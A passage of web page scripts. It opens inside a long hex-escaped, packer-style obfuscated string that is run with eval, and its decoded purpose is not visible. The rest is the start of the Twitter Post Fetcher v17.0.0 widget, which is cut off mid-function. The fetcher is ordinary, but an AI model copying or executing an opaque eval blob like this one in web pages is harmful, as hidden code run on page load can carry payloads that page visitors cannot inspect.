6\x5c\x5c\x39\x5c\x5c\x66\x5c\x5c\x43\x5c\x5c\x44\x5c\x5c\x76\x5c\x5c\x47\x5c\x5c\x39\x5c\x5c\x44\x5c\x5c\x6d\x5c\x5c\x6b\x5c\x5c\x39\x5c\x5c\x51\x5c\x5c\x51\x5c\x5c\x51\x5c\x5c\x39\x5c\x5c\x4a\x5c\x5c\x64\x5c\x5c\x66\x5c\x5c\x31\x67\x5c\x5c\x74\x5c\x5c\x6e\x5c\x5c\x66\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x70\x5c\x5c\x44\x5c\x5c\x47\x5c\x5c\x70\x5c\x5c\x66\x5c\x5c\x6d\x5c\x5c\x6c\x5c\x5c\x72\x5c\x5c\x4a\x5c\x5c\x39\x5c\x5c\x70\x5c\x5c\x64\x5c\x5c\x66\x5c\x5c\x31\x31\x5c\x5c\x66\x5c\x5c\x66\x5c\x5c\x6d\x5c\x5c\x6c\x5c\x5c\x47\x5c\x5c\x44\x5c\x5c\x66\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x43\x5c\x5c\x66\x5c\x5c\x76\x5c\x5c\x6b\x5c\x5c\x42\x5c\x5c\x71\x5c\x5c\x74\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x46\x5c\x5c\x6e\x5c\x5c\x4a\x5c\x5c\x64\x5c\x5c\x6d\x5c\x5c\x39\x5c\x5c\x70\x5c\x5c\x6c\x5c\x5c\x31\x39\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x42\x5c\x5c\x71\x5c\x5c\x76\x5c\x5c\x39\x5c\x5c\x39\x5c\x5c\x64\x5c\x5c\x6b\x5c\x5c\x70\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x70\x5c\x5c\x44\x5c\x5c\x76\x5c\x5c\x76\x5c\x5c\x6e\x5c\x5c\x6d\x5c\x5c\x48\x5c\x5c\x39\x5c\x5c\x6c\x5c\x5c\x72\x5c\x5c\x74\x5c\x5c\x64\x5c\x5c\x31\x30\x5c\x5c\x31\x36\x5c\x5c\x45\x5c\x5c\x39\x5c\x5c\x6d\x5c\x5c\x64\x5c\x5c\x46\x5c\x5c\x64\x5c\x5c\x6e\x5c\x5c\x66\x5c\x5c\x39\x5c\x5c\x46\x5c\x5c\x71\x5c\x5c\x70\x5c\x5c\x66\x5c\x5c\x70\x5c\x5c\x39\x5c\x5c\x43\x5c\x5c\x66\x5c\x5c\x66\x5c\x5c\x46\x5c\x5c\x39\x5c\x5c\x6b\x5c\x5c\x64\x5c\x5c\x72\x5c\x5c\x4a\x5c\x5c\x66\x5c\x5c\x43\x5c\x5c\x39\x5c\x5c\x39\x5c\x5c\x72\x5c\x5c\x71\x5c\x5c\x39\x5c\x5c\x6c\x5c\x5c\x72\x5c\x5c\x39\x5c\x5c\x74\x5c\x5c\x6e\x5c\x5c\x66\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x4a\x5c\x5c\x64\x5c\x5c\x66\x5c\x5c\x39\x5c\x5c\x45\x5c\x5c\x6c\x5c\x5c\x72\x5c\x5c\x74\x5c\x5c\x39\x5c\x5c\x42\x5c\x5c\x71\x5c\x5c\x55\x5c\x5c\x64\x5c\x5c\x6d\x5c\x5c\x39\x5c\x5c\x48\x5c\x5c\x71\x5c\x5c\x44\x5c\x5c\x66\x5c\x5c\x44\x5c\x5c\x47\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x48\x5c\x5c\x64\x5c\x5c\x6e\x5c\x5c\x6d\x5c\x5c\x39\x5c\x5c\x70\x5c\x5c\x6d\x5c\x5c\x42\x5c\x5c\x6a\x5c\x5c\x39\x5c\x5c\x76\x5c\x5c\x71\x5c\x5c\x72\x5c\x5c\x66\x5c\x5c\x43\x5c\x5c\x39\x5c\x5c\x71\x5c\x5c\x55\x5c\x5c\x64\x5c\x5c\x6d\x5c\x5c\x6b\x5c\x5c\x6e\x5c\x5c\x48\x5c\x5c\x39\x5c\x5c\x46\x5c\x5c\x71\x5c\x5c\x70\x5c\x5c\x66\x5c\x5c\x6b\x5c\x5c\x6e\x5c\x5c\x47\x5c\x5c\x64\x5c\x5c\x6b\x5c\x5c\x39\x5c\x5c\x6b\x5c\x5c\x6c\x5c\x5c\x39\x5c\x5c\x6d\x5c\x5c\x64\x5c\x5c\x42\x5c\x5c\x64\x5c\x5c\x72\x5c\x5c\x66\x5c\x5c\x39\x5c\x5c\x64\x5c\x5c\x76\x5c\x5c\x47\x5c\x5c\x64\x5c\x5c\x74\x5c\x5c\x39\x5c\x5c\x74\x5c\x5c\x6e\x5c\x5c\x48\x5c\x5c\x39\x5c\x5c\x46\x5c\x5c\x71\x5c\x5c\x70\x5c\x5c\x66\x5c\x5c\x66\x5c\x5c\x6c\x5c\x5c\x66\x5c\x5c\x6b\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x43\x5c\x5c\x49\x5c\x5c\x39\x5c\x5c\x74\x5c\x5c\x64\x5c\x5c\x45\x5c\x5c\x6e\x5c\x5c\x44\x5c\x5c\x6b\x5c\x5c\x66\x5c\x5c\x39\x5c\x5c\x6d\x5c\x5c\x64\x5c\x5c\x6b\x5c\x5c\x39\x5c\x5c\x47\x5c\x5c\x6b\x5c\x5c\x71\x5c\x5c\x4a\x5c\x5c\x39\x5c\x5c\x51\x5c\x5c\x6e\x5c\x5c\x48\x5c\x5c\x6a\x5c\x5c\x66\x5c\x5c\x43\x5c\x5c\x64\x5c\x5c\x76\x5c\x5c\x64\x5c\x5c\x70\x5c\x5c\x39\x5c\x5c\x51\x5c\x5c\x6c\x5c\x5c\x72\x5c\x5c\x74\x5c\x5c\x71\x5c\x5c\x51\x5c\x5c\x39\x5c\x5c\x43\x5c\x5c\x63\x5c\x5c\x39\x5c\x5c\x74\x5c\x5c\x71\x5c\x5c\x42\x5c\x5c\x44\x5c\x5c\x76\x5c\x5c\x64\x5c\x5c\x72\x5c\x5c\x66\x5c\x5c\x39\x5c\x5c\x66\x5c\x5c\x64\x5c\x5c\x31\x30\x5c\x5c\x66\x5c\x5c\x39\x5c\x5c\x43\x5c\x5c\x31\x63\x5c\x5c\x39\x5c\x5c\x45\x5c\x5c\x71\x5c\x5c\x6d\x5c\x5c\x39\x5c\x5c\x66\x5c\x5c\x43\x5c\x5c\x6c\x5c\x5c\x70\x5c\x5c\x39\x5c\x5c\x64\x5c\x5c\x6e\x5c\x5c\x42\x5c\x5c\x43\x5c\x5c\x39\x5c\x5c\x44\x5c\x5c\x6b\x5c\x5c\x39\x5c\x5c\x59\x5c\x5c\x46\x5c\x5c\x4a\x5c\x5c\x39\x5c\x5c\x6e\x5c\x5c\x59\x5c\x5c\x6e\x5c\x5c\x31\x30\x5c\x5c\x39\x5c\x5c\x45\x5c\x5c\x64\x5c\x5c\x64\x5c\x5c\x74\x5c\x5c\x70\x5c\x5c\x39\x5c\x5c\x42\x5c\x5c\x6e\x5c\x5c\x66\x5c\x5c\x64\x5c\x5c\x4a\x5c\x5c\x71\x5c\x5c\x6d\x5c\x5c\x48\x5c\x5c\x39\x5c\x5c\x31\x6a\x5c\x5c\x4e\x5c\x5c\x39\x5c\x5c\x46\x5c\x5c\x44\x5c\x5c\x47\x5c\x5c\x6b\x5c\x5c\x6c\x5c\x5c\x70\x5c\x5c\x43\x5c\x5c\x64\x5c\x5c\x74\x5c\x5c\x39\x5c\x5c\x72\x5c\x5c\x64\x5c\x5c\x51\x5c\x5c\x64\x5c\x5c\x6d\x5c\x5c\x39\x5c\x5c\x6d\x5c\x5c\x64\x5c\x5c\x6e\x5c\x5c\x74\x5c\x5c\x48\x5c\x5c\x39\x5c\x5c\x71\x5c\x5c\x6b\x5c\x5c\x74\x5c\x5c\x64\x5c\x5c\x6d\x5c\x5c\x39\x5c\x5c\x31\x35\x5c\x5c\x31\x36\x5c\x5c\x31\x78\x5c\x5c\x31\x33\x5c\x5c\x31\x35\x5c\x5c\x31\x31\x5c\x5c\x31\x62\x5c\x5c\x58\x5c\x5c\x31\x34\x5c\x5c\x31\x67\x5c\x5c\x31\x6c\x5c\x5c\x58\x5c\x5c\x31\x6b\x5c\x5c\x58\x5c\x5c\x31\x34\x5c\x5c\x39\x5c\x5c\x66\x5c\x5c\x64\x5c\x5c\x6d\x5c\x5c\x76\x5c\x5c\x39\x5c\x5c\x6e\x5c\x5c\x6b\x5c\x5c\x66\x5c\x5c\x39\x5c\x5c\x31\x35\x5c\x5c\x31\x36\x5c\x5c\x31\x78\x5c\x5c\x31\x33\x5c\x5c\x31\x35\x5c\x5c\x31\x31\x5c\x5c\x31\x62\x5c\x5c\x58\x5c\x5c\x31\x34\x5c\x5c\x31\x67\x5c\x5c\x31\x36\x5c\x5c\x31\x65\x5c\x5c\x31\x61\x5c\x5c\x58\x5c\x5c\x31\x34\x5c\x5c\x39\x5c\x5c\x76\x5c\x5c\x6e\x5c\x5c\x31\x30\x5c\x5c\x39\x5c\x5c\x70\x5c\x5c\x44\x5c\x5c\x42\x5c\x5c\x42\x5c\x5c\x64\x5c\x5c\x70\x5c\x5c\x70\x5c\x5c\x39\x5c\x5c\x59\x5c\x5c\x70\x5c\x5c\x71\x5c\x5c\x72\x5c\x5c\x46\x5c\x5c\x39\x5c\x5c\x31\x34\x5c\x5c\x64\x5c\x5c\x42\x5c\x5c\x71\x5c\x5c\x76\x5c\x5c\x76\x5c\x5c\x64\x5c\x5c\x72\x5c\x5c\x74\x5c\x5c\x64\x5c\x5c\x74\x5c\x5c\x39\x5c\x5c\x31\x31\x5c\x5c\x6d\x5c\x5c\x66\x5c\x5c\x6c\x5c\x5c\x42\x5c\x5c\x6b\x5c\x5c\x64\x5c\x5c\x70\x5c\x5c\x39\x5c\x5c\x76\x5c\x5c\x71\x5c\x5c\x72\x5c\x5c\x66\x5c\x5c\x43\x5c\x5c\x31\x67\x5c\x5c\x45\x5c\x5c\x71\x5c\x5c\x6d\x5c\x5c\x76\x5c\x5c\x6e\x5c\x5c\x66\x5c\x5c\x39\x5c\x5c\x6e\x5c\x5c\x6b\x5c\x5c\x66\x5c\x5c\x64\x5c\x5c\x6d\x5c\x5c\x72\x5c\x5c\x6e\x5c\x5c\x66\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x47\x5c\x5c\x31\x67\x5c\x5c\x6d\x5c\x5c\x42\x5c\x5c\x39\x5c\x5c\x74\x5c\x5c\x6e\x5c\x5c\x66\x5c\x5c\x6e\x5c\x5c\x31\x33\x5c\x5c\x48\x5c\x5c\x46\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x63\x5c\x5c\x63\x5c\x5c\x4e\x5c\x5c\x39\x5c\x5c\x70\x5c\x5c\x42\x5c\x5c\x6d\x5c\x5c\x6c\x5c\x5c\x46\x5c\x5c\x66\x5c\x5c\x39\x5c\x5c\x47\x5c\x5c\x6d\x5c\x5c\x64\x5c\x5c\x6e\x5c\x5c\x50\x5c\x5c\x39\x5c\x5c\x6d\x5c\x5c\x64\x5c\x5c\x70\x5c\x5c\x44\x5c\x5c\x6b\x5c\x5c\x66\x5c\x5c\x70\x5c\x5c\x39\x5c\x5c\x66\x5c\x5c\x48\x5c\x5c\x46\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x6d\x5c\x5c\x64\x5c\x5c\x6b\x5c\x5c\x6e\x5c\x5c\x66\x5c\x5c\x64\x5c\x5c\x74\x5c\x5c\x31\x67\x5c\x5c\x72\x5c\x5c\x44\x5c\x5c\x76\x5c\x5c\x47\x5c\x5c\x64\x5c\x5c\x6d\x5c\x5c\x39\x5c\x5c\x59\x5c\x5c\x70\x5c\x5c\x71\x5c\x5c\x72\x5c\x5c\x39\x5c\x5c\x66\x5c\x5c\x6e\x5c\x5c\x4a\x5c\x5c\x39\x5c\x5c\x6b\x5c\x5c\x71\x5c\x5c\x42\x5c\x5c\x6e\x5c\x5c\x66\x5c\x5c\x6c\x5c\x5c\x71\x5c\x5c\x72\x5c\x5c\x39\x5c\x5c\x74\x5c\x5c\x71\x5c\x5c\x45\x5c\x5c\x71\x5c\x5c\x6b\x5c\x5c\x6b\x5c\x5c\x71\x5c\x5c\x51\x5c\x5c\x39\x5c\x5c\x31\x37\x5c\x5c\x6b\x5c\x5c\x71\x5c\x5c\x4a\x5c\x5c\x4a\x5c\x5c\x64\x5c\x5c\x6d\x5c\x5c\x39\x5c\x5c\x31\x33\x5c\x5c\x64\x5c\x5c\x76\x5c\x5c\x46\x5c\x5c\x6b\x5c\x5c\x6e\x5c\x5c\x66\x5c\x5c\x64\x5c\x5c\x70\x5c\x5c\x39\x5c\x5c\x72\x5c\x5c\x44\x5c\x5c\x6b\x5c\x5c\x6b\x5c\x5c\x39\x5c\x5c\x76\x5c\x5c\x48\x5c\x5c\x42\x5c\x5c\x71\x5c\x5c\x72\x5c\x5c\x66\x5c\x5c\x64\x5c\x5c\x72\x5c\x5c\x66\x5c\x5c\x39\x5c\x5c\x70\x5c\x5c\x4d\x5c\x5c\x31\x63\x5c\x5c\x4e\x5c\x5c\x39\x5c\x5c\x70\x5c\x5c\x63\x5c\x5c\x4d\x5c\x5c\x4e\x5c\x5c\x4e\x5c\x5c\x39\x5c\x5c\x71\x5c\x5c\x72\x5c\x5c\x6b\x5c\x5c\x71\x5c\x5c\x6e\x5c\x5c\x74\x5c\x5c\x39\x5c\x5c\x4a\x5c\x5c\x64\x5c\x5c\x66\x5c\x5c\x58\x5c\x5c\x6b\x5c\x5c\x64\x5c\x5c\x76\x5c\x5c\x64\x5c\x5c\x72\x5c\x5c\x66\x5c\x5c\x31\x37\x5c\x5c\x48\x5c\x5c\x31\x64\x5c\x5c\x74\x5c\x5c\x39\x5c\x5c\x74\x5c\x5c\x6c\x5c\x5c\x70\x5c\x5c\x46\x5c\x5c\x6b\x5c\x5c\x6e\x5c\x5c\x48\x5c\x5c\x39\x5c\x5c\x6c\x5c\x5c\x72\x5c\x5c\x6b\x5c\x5c\x6c\x5c\x5c\x72\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x55\x5c\x5c\x6c\x5c\x5c\x70\x5c\x5c\x6c\x5c\x5c\x47\x5c\x5c\x6c\x5c\x5c\x6b\x5c\x5c\x6c\x5c\x5c\x66\x5c\x5c\x48\x5c\x5c\x39\x5c\x5c\x55\x5c\x5c\x6c\x5c\x5c\x70\x5c\x5c\x6c\x5c\x5c\x47\x5c\x5c\x6b\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x71\x5c\x5c\x46\x5c\x5c\x6e\x5c\x5c\x42\x5c\x5c\x6c\x5c\x5c\x66\x5c\x5c\x48\x5c\x5c\x39\x5c\x5c\x6c\x5c\x5c\x72\x5c\x5c\x72\x5c\x5c\x64\x5c\x5c\x6d\x5c\x5c\x31\x66\x5c\x5c\x31\x33\x5c\x5c\x31\x69\x5c\x5c\x31\x65\x5c\x5c\x39\x5c\x5c\x4e\x5c\x5c\x4e\x5c\x5c\x6e\x5c\x5c\x4d\x5c\x5c\x31\x6a\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x42\x5c\x5c\x71\x5c\x5c\x6b\x5c\x5c\x71\x5c\x5c\x6d\x5c\x5c\x39\x5c\x5c\x47\x5c\x5c\x6b\x5c\x5c\x71\x5c\x5c\x42\x5c\x5c\x50\x5c\x5c\x39\x5c\x5c\x45\x5c\x5c\x71\x5c\x5c\x72\x5c\x5c\x66\x5c\x5c\x39\x5c\x5c\x6c\x5c\x5c\x72\x5c\x5c\x43\x5c\x5c\x64\x5c\x5c\x6d\x5c\x5c\x6c\x5c\x5c\x66\x5c\x5c\x39\x5c\x5c\x70\x5c\x5c\x49\x5c\x5c\x6a\x5c\x5c\x4e\x5c\x5c\x39\x5c\x5c\x70\x5c\x5c\x31\x63\x5c\x5c\x4e\x5c\x5c\x4e\x5c\x5c\x39\x5c\x5c\x66\x5c\x5c\x43\x5c\x5c\x44\x5c\x5c\x76\x5c\x5c\x47\x5c\x5c\x72\x5c\x5c\x6e\x5c\x5c\x6c\x5c\x5c\x6b\x5c\x5c\x39\x5c\x5c\x72\x5c\x5c\x71\x5c\x5c\x31\x67\x5c\x5c\x6c\x5c\x5c\x76\x5c\x5c\x6e\x5c\x5c\x4a\x5c\x5c\x64\x5c\x5c\x39\x5c\x5c\x76\x5c\x5c\x64\x5c\x5c\x74\x5c\x5c\x6c\x5c\x5c\x6e\x5c\x5c\x39\x5c\x5c\x43\x5c\x5c\x66\x5c\x5c\x66\x5c\x5c\x46\x5c\x5c\x70\x5c\x5c\x39\x5c\x5c\x46\x5c\x5c\x6e\x5c\x5c\x6d\x5c\x5c\x70\x5c\x5c\x64\x5c\x5c\x31\x64\x5c\x5c\x72\x5c\x5c\x66\x5c\x5c\x39\x5c\x5c\x31\x6b\x5c\x5c\x6e\x5c\x5c\x48\x5c\x5c\x6a\x5c\x5c\x31\x33\x5c\x5c\x43\x5c\x5c\x64\x5c\x5c\x76\x5c\x5c\x64\x5c\x5c\x70\x5c\x5c\x39\x5c\x5c\x45\x5c\x5c\x6c\x5c\x5c\x6d\x5c\x5c\x70\x5c\x5c\x66\x5c\x5c\x39\x5c\x5c\x76\x5c\x5c\x57\x5c\x5c\x74\x5c\x5c\x64\x5c\x5c\x45\x5c\x5c\x6e\x5c\x5c\x44\x5c\x5c\x6b\x5c\x5c\x66\x5c\x5c\x39\x5c\x5c\x42\x5c\x5c\x6b\x5c\x5c\x64\x5c\x5c\x6e\x5c\x5c\x6d\x5c\x5c\x39\x5c\x5c\x70\x5c\x5c\x31\x6f\x5c\x5c\x6a\x22\x2c\x22\x22\x2c\x22\x5c\x5c\x45\x5c\x5c\x6d\x5c\x5c\x71\x5c\x5c\x76\x5c\x5c\x31\x38\x5c\x5c\x43\x5c\x5c\x6e\x5c\x5c\x6d\x5c\x5c\x31\x38\x5c\x5c\x71\x5c\x5c\x74\x5c\x5c\x64\x22\x2c\x22\x5c\x5c\x31\x47\x5c\x5c\x47\x22\x2c\x22\x5c\x5c\x4a\x22\x2c\x22\x5c\x5c\x6d\x5c\x5c\x64\x5c\x5c\x46\x5c\x5c\x6b\x5c\x5c\x6e\x5c\x5c\x42\x5c\x5c\x64\x22\x5d\x3b\x31\x4c\x28\x31\x45\x28\x31\x42\x2c\x31\x7a\x2c\x5a\x2c\x31\x44\x2c\x31\x74\x2c\x31\x52\x29\x7b\x31\x74\x3d\x31\x45\x28\x5a\x29\x7b\x31\x46\x28\x5a\x3c\x31\x7a\x3f\x31\x32\x5b\x34\x5d\x3a\x31\x74\x28\x31\x59\x28\x5a\x2f\x31\x7a\x29\x29\x29\x2b\x28\x28\x5a\x3d\x5a\x25\x31\x7a\x29\x3e\x31\x58\x3f\x31\x57\x5b\x31\x32\x5b\x35\x5d\x5d\x28\x5a\x2b\x31\x56\x29\x3a\x5a\x2e\x31\x55\x28\x31\x4d\x29\x29\x7d\x3b\x31\x53\x28\x5a\x2d\x2d\x29\x7b\x31\x54\x28\x31\x44\x5b\x5a\x5d\x29\x7b\x31\x42\x3d\x31\x42\x5b\x31\x32\x5b\x38\x5d\x5d\x28\x31\x51\x20\x31\x50\x28\x31\x32\x5b\x36\x5d\x2b\x31\x74\x28\x5a\x29\x2b\x31\x32\x5b\x36\x5d\x2c\x31\x32\x5b\x37\x5d\x29\x2c\x31\x44\x5b\x5a\x5d\x29\x7d\x7d\x3b\x31\x46\x20\x31\x42\x7d\x28\x31\x32\x5b\x30\x5d\x2c\x31\x4f\x2c\x31\x4e\x2c\x31\x32\x5b\x33\x5d\x5b\x31\x32\x5b\x32\x5d\x5d\x28\x31\x32\x5b\x31\x5d\x29\x29\x29\x27\x2c\x36\x32\x2c\x31\x32\x33\x2c\x27\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x7c\x78\x37\x43\x7c\x78\x32\x32\x7c\x78\x32\x45\x7c\x78\x33\x31\x7c\x78\x36\x35\x7c\x78\x32\x37\x7c\x78\x37\x34\x7c\x78\x32\x30\x7c\x78\x32\x39\x7c\x78\x32\x38\x7c\x78\x33\x32\x7c\x78\x36\x43\x7c\x78\x36\x39\x7c\x78\x37\x32\x7c\x78\x36\x31\x7c\x78\x33\x44\x7c\x78\x37\x33\x7c\x78\x36\x46\x7c\x78\x36\x45\x7c\x78\x32\x42\x7c\x78\x36\x34\x7c\x78\x33\x45\x7c\x78\x36\x44\x7c\x78\x32\x43\x7c\x78\x33\x43\x7c\x78\x32\x46\x7c\x78\x32\x44\x7c\x78\x33\x42\x7c\x78\x36\x33\x7c\x78\x36\x38\x7c\x78\x37\x35\x7c\x78\x36\x36\x7c\x78\x37\x30\x7c\x78\x36\x32\x7c\x78\x37\x39\x7c\x78\x33\x33\x7c\x78\x36\x37\x7c\x78\x37\x42\x7c\x78\x37\x44\x7c\x78\x33\x36\x7c\x78\x33\x30\x7c\x78\x33\x41\x7c\x78\x36\x42\x7c\x78\x37\x37\x7c\x78\x33\x39\x7c\x78\x35\x44\x7c\x78\x35\x42\x7c\x78\x37\x36\x7c\x78\x32\x34\x7c\x78\x37\x31\x7c\x78\x34\x35\x7c\x78\x36\x41\x7c\x5f\x30\x78\x63\x35\x34\x62\x78\x33\x7c\x78\x37\x38\x7c\x78\x34\x31\x7c\x5f\x30\x78\x66\x63\x65\x30\x7c\x78\x35\x34\x7c\x78\x35\x32\x7c\x78\x35\x30\x7c\x78\x34\x46\x7c\x78\x34\x32\x7c\x78\x34\x33\x7c\x78\x37\x41\x7c\x78\x34\x34\x7c\x78\x34\x37\x7c\x78\x33\x34\x7c\x78\x34\x39\x7c\x78\x34\x43\x7c\x78\x34\x38\x7c\x78\x35\x46\x7c\x78\x34\x36\x7c\x78\x34\x44\x7c\x78\x33\x38\x7c\x78\x35\x37\x7c\x78\x34\x45\x7c\x78\x34\x41\x7c\x78\x33\x35\x7c\x78\x33\x37\x7c\x78\x35\x31\x7c\x78\x34\x42\x7c\x78\x32\x33\x7c\x78\x32\x31\x7c\x5f\x30\x78\x63\x35\x34\x62\x78\x35\x7c\x78\x35\x35\x7c\x78\x35\x36\x7c\x78\x35\x41\x7c\x78\x35\x33\x7c\x78\x35\x38\x7c\x5f\x30\x78\x63\x35\x34\x62\x78\x32\x7c\x78\x35\x39\x7c\x5f\x30\x78\x63\x35\x34\x62\x78\x31\x7c\x78\x32\x36\x7c\x5f\x30\x78\x63\x35\x34\x62\x78\x34\x7c\x66\x75\x6e\x63\x74\x69\x6f\x6e\x7c\x72\x65\x74\x75\x72\x6e\x7c\x78\x35\x43\x7c\x78\x32\x41\x7c\x78\x35\x45\x7c\x78\x33\x46\x7c\x76\x61\x72\x7c\x65\x76\x61\x6c\x7c\x33\x36\x7c\x31\x35\x37\x7c\x36\x32\x7c\x52\x65\x67\x45\x78\x70\x7c\x6e\x65\x77\x7c\x5f\x30\x78\x63\x35\x34\x62\x78\x36\x7c\x77\x68\x69\x6c\x65\x7c\x69\x66\x7c\x74\x6f\x53\x74\x72\x69\x6e\x67\x7c\x32\x39\x7c\x53\x74\x72\x69\x6e\x67\x7c\x33\x35\x7c\x70\x61\x72\x73\x65\x49\x6e\x74\x27\x2e\x73\x70\x6c\x69\x74\x28\x27\x7c\x27\x29\x2c\x30\x2c\x7b\x7d\x29\x29\x0a";eval(_vFYKNG);
 //]]>
</script>

<script>
//<![CDATA[
/*********************************************************************
*  #### Twitter Post Fetcher v17.0.0 ####
*  Coded by Jason Mayes 2015. A present to all the developers out there.
*  www.jasonmayes.com
*  Please keep this disclaimer with my code if you use it. Thanks. :-)
*  Got feedback or questions, ask here:
*  http://www.jasonmayes.com/projects/twitterApi/
*  Github: https://github.com/jasonmayes/Twitter-Post-Fetcher
*  Updates will be posted to this site.
*********************************************************************/
(function(root,factory){if(typeof define==='function'&&define.amd){define([],factory);}else if(typeof exports==='object'){module.exports=factory();}else{factory();}}(this,function(){var domNode='';var maxTweets=20;var parseLinks=true;var queue=[];var inProgress=false;var printTime=true;var printUser=true;var formatterFunction=null;var supportsClassName=true;var showRts=true;var customCallbackFunction=null;var showInteractionLinks=true;var showImages=false;var targetBlank=true;var lang='en';var permalinks=true;var dataOnly=false;var script=null;var scriptAdded=false;function handleTweets(tweets){if(customCallbackFunction===null){var x=tweets.length;var n=0;var element=document.getElementById(domNode);var html='<ul id="clients-list">';while(n<x){html+='<li>'+tweets[n]+'</li>';n++;}
html+='</ul>';element.innerHTML=html;}else{customCallbackFunction(tweets);}}
function strip(data){return data.replace(/<b[^>]*>(.*?)<\/b>/gi,function(a,s){return s;}).replace(/class="(?!(tco-hidden|tco-display|tco-ellipsis))+.*?"|data-query-source=".*?"|dir=".*?"|rel=".*?"/gi,'');}
function targetLinksToNewWindow(el){var links=el.getElementsByTagName('a');for(var i=links.length-1;i>=0;i--){links[i].setAttribute('target','_blank');}}
function getElementsByClassName(node,classname){var a=[];var regex=new RegExp('(^| )'+classname+'( |$)');var elems=node.getElementsByTagName('*');for(var i=0,j=elems.length;i<j;i++){if(regex.test(elems[i].className)){a.push(elems[i]);}}
return a;}
function extractImageUrl(image_data){if(image_data!==undefined&&image_data.innerHTML.indexOf('data-srcset')>=0){var data_src=image_data.innerHTML.match(/data-srcset="([A-z0-9%_\.-]+)/i)[0];return decodeURIComponent(data_src).split('"')[1];}}
var twitterFetcher={fetch:function(config){if(config.maxTweets===undefined){config.maxTweets=20;}
if(config.enableLinks===undefined){config.enableLinks=true;}
if(config.showUser===undefined){config.showUser=true;}
if(config.showTime===undefined){config.showTime=true;}
if(config.dateFunction===undefined){config.dateFunction='default';}
if(config.showRetweet===undefined){config.showRetweet=true;}
if(config.customCallback===undefined){config.customCallback=null;}
if(config.showInteraction===undefined){config.showInteraction=true;}
if(config.showImages===undefined){config.showImages=false;}
if(config.linksInNewWindow===undefined){config.linksInNewWindow=true;}
if(config.showPermalinks===undefined){config.showPermalinks=true;}
if(config.dataOnly===undefined){config.dataOnly=false;}
if(inProgress){queue.push(config);}else{inProgress=true;domNode=config.domId;maxTweets=config.maxTweets;parseLinks=config.enableLinks;printUser=config.showUser;printTime=config.showTime;showRts=config.showRetweet;formatterFunction=config.dateFunction;customCallbackFunction=config.customCallback;showInteractionLinks=config.showInteraction;showImages=config.showImages;targetBlank=config.linksInNewWindow;permalinks=config.showPermalinks;dataOnly=config.dataOnly;var head=document.getElementsByTagName('head')[0];if(script!==null){head.removeChild(script);}
script=document.createElement('script');script.type='text/javascript';if(config.list!==undefined){script.src='https://syndication.twitter.com/timeline/list?'+'callback=__twttrf.callback&dnt=false&list_slug='+
config.list.listSlug+'&screen_name='+config.list.screenName+'&suppress_response_codes=true&lang='+(config.lang||lang)+'&rnd='+Math.random();}else if(config.profile!==undefined){script.src='https://syndication.twitter.com/timeline/profile?'+'callback=__twttrf.callback&dnt=false'+'&screen_name='+config.profile.screenName+'&suppress_response_codes=true&lang='+(config.lang||lang)+'&rnd='+Math.random();}else if(config.likes!==undefined){script.src='https://syndication.twitter.com/timeline/likes?'+'callback=__twttrf.callback&dnt=false'+'&screen_name='+config.likes.screenName+'&suppress_response_codes=true&lang='+(config.lang||lang)+'&rnd='+Math.random();}else{script.src='https://cdn.syndication.twimg.com/widgets/timelines/'+
config.id+'?&lang='+(config.lang||lang)+'&callback=__twttrf.callback&'+'suppress_response_codes=true&rnd='+Math.random();}
head.appendChild(script);}},callback:function(data){if(data===undefined||data.body===undefined){inProgress=false;if(queue.length>0){twitterFetcher.fetch(queue[0]);queue.splice(0,1);}
return;}
data.body=data.body.replace(/(<img[^c]*class="Emoji[^>]*>)|(<img[^c]*class="u-block[^>]*>)/g,'');if(!showImages){data.body=data.body.replace(/(<img[^c]*class="NaturalImage-image[^>]*>|(<img[^c]*class="CroppedImage-image[^>]*>))/g,'');}
if(!printUser){data.body=data.body.replace(/(<img[^c]*class="Avatar"[^>]*>)/g,'');}
var div=document.createElement('div');div.innerHTML=data.body;if(typeof(div.getElementsByClassName)==='undefined'){supportsClassName=false;}
function swapDataSrc(element){var avatarImg=element.getElementsByTagName('img')[0];avatarImg.src=avatarImg.getAttribute('data-src-2x');return element;}
var tweets=[];var authors=[];var times=[];var images=[];var rts=[];var tids=[];var permalinksURL=[];var x=0;if(supportsClassName){var tmp=div.getElementsByClassName('timeline-Tweet');while(x<tmp.length){if(tmp[x].getElementsByClassName('timeline-Tweet-retweetCredit').length>0){rts.push(true);}else{rts.push(false);}
if(!rts[x]||rts[x]&&showRts){tweets.push(tmp[x].getElementsByClassName('timeline-Tweet-text')[0]);tids.push(tmp[x].getAttribute('data-tweet-id'));if(printUser){authors.push(swapDataSrc(tmp[x].getElementsByClassName('timeline-Tweet-author')[0]));}
times.push(tmp[x].getElementsByClassName('dt-updated')[0]);permalinksURL.push(tmp[x].getElementsByClassName('timeline-Tweet-timestamp')[0]);if(tmp[x].getElementsByClassName('timeline-Tweet-media')[0]!==undefined){images.push(tmp[x].getElementsByClassName('timeline-Tweet-media')[0]);}else{images.push(undefined);}}
x++;}}else{var tmp=getElementsByClassName(div,'timeline-Tweet');while(x<tmp.length){if(getElementsByClassName(tmp[x],'timeline-Tweet-retweetCredit').length>0){rts.push(true);}else{rts.push(false);}
if(!rts[x]||rts[x]&&showRts){tweets.push(getElementsByClassName(tmp[x],'timeline-Tweet-text')[0]);tids.push(tmp[x].getAttribute('data-tweet-id'));if(printUser){authors.push(swapDataSrc(getElementsByClassName(tmp[x],'timeline-Tweet-author')[0]));}
times.push(getElementsByClassName(tmp[x],'dt-updated')[0]);permalinksURL.push(getElementsByClassName(tmp[x],'timeline-Tweet-timestamp')[0]);if(getElementsByClassName(tmp[x],'timeline-Tweet-media')[0]!==undefined){images.push(getElementsByClassName(tmp[x],'timeline-Tweet-media')[0]);}else{images.push(undefined);}}
x++;}}
